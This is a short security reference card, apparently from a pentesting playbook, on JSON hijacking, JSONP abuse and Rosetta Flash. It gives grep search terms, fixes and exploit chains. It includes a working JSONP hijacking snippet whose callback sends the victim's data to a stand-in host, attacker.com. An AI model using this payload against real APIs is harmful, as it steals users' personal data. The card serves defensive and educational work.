# JSON Hijacking & Array Poisoning

**Tags:** #medium #json #xss #data-exfiltration
**OWASP:** A01:2021-Broken Access Control
**CVSS Base:** 6.5 (Medium) — 7.5 (High if PII is leaked)

---

## 📖 What it is

**JSON Hijacking:** In legacy browsers, JSON arrays returned as a top-level response could be intercepted by a malicious site using the `<script>` tag. Since `<script>` is cross-origin by design, the attacker's site can read the data by overriding the `Array` constructor or using proxies.

**Modern Context:** While modern browsers prevent `Array` constructor poisoning, many applications still use **JSONP** (JSON with Padding) which remains inherently vulnerable to hijacking if not strictly restricted.

---

## 🔍 `grep_search` Tactics

```
callback=
jsonp
.toJSON()
JSON.stringify
application/json
Content-Type
```

---

## 💣 Attack Category 1: JSONP Hijacking

**How it works:** The API returns data wrapped in a callback function specified by the user. An attacker site loads the API URL in a `<script>` tag and defines the callback to steal the data.

**Attack:**
```html
<!-- Malicious page on attacker.com -->
<script>
  function steal(data) {
    fetch('https://attacker.com/collect?data=' + JSON.stringify(data));
  }
</script>
<script src="https://target.com/api/user?callback=steal"></script>
```

---

## 💣 Attack Category 2: Rosetta Flash (legacy but relevant)

**How it works:** If an API allows a JSONP callback with arbitrary characters, an attacker can craft a callback that is actually valid ActionScript/Flash byte-code, allowing them to bypass CORS entirely.

---

## 🛡️ Fix

1. **Avoid JSONP:** Use CORS (`Access-Control-Allow-Origin`) instead.
2. **Prevent Content-Type Sniffing:** Ensure `X-Content-Type-Options: nosniff` is present.
3. **Use Object Literals:** Never return sensitive data as a top-level JSON Array. Use an object: `{"data": [...]}`.
4. **CSRF Protection:** Ensure JSONP endpoints require a non-predictable CSRF token.

---

## 🔗 Chain Exploits

```
JSON Hijacking + Sensitive PII ➔ Identity theft of logged-in users
JSONP + XSS ➔ Bypassing CSP via JSONP callback gadgets
```
